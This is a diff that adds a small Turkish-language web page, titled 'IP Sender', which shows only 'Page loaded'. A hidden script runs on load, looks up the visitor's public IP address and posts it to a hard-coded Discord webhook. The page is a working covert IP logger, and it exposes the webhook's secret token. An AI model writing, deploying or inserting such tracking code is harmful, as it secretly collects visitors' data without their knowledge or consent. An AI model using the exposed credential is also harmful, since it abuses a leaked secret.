@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>IP Gönderici</title>
+</head>
+<body>
+  <h1>Sayfa yüklendi</h1>
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const webhookURL = 'https://discord.com/api/webhooks/1396279953896636526/2EBRWqSeo04I0_-1P9QjGbFrpE37IZ3ShrztrEgpN7t8Q6D8M4_EH3rfNzwpsE0LIKIo';
+
+        const payload = {
+          content: `🛰️ Yeni IP adresi: ${data.ip}`
+        };
+
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      });
+  </script>
+</body>
+</html>
